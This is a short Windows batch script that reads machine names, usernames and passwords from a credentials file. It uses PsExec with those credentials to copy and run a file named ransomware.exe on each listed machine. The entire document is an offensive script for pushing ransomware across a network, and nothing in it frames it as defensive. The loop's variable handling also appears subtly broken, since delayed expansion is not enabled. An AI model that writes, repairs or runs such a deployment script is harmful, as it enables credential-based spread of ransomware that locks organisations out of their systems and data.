@echo off
setlocal

:: Define the source and target paths
set source_path=C:\Path\To\ransomware.exe
set target_directory=C:\Temp

:: Path to the credentials file
set credentials_file=credentials.txt

:: Loop through each line in the credentials file
for /F "tokens=1,2,3 delims=," %%i in (%credentials_file%) do (
    set target_machine=%%i
    set username=%%j
    set password=%%k
    echo Deploying to %target_machine% with user %username%
    :: Deploy the executable using PsExec
    psexec \\%target_machine% -u %username% -p %password% -c %source_path% %target_directory%
)

endlocal
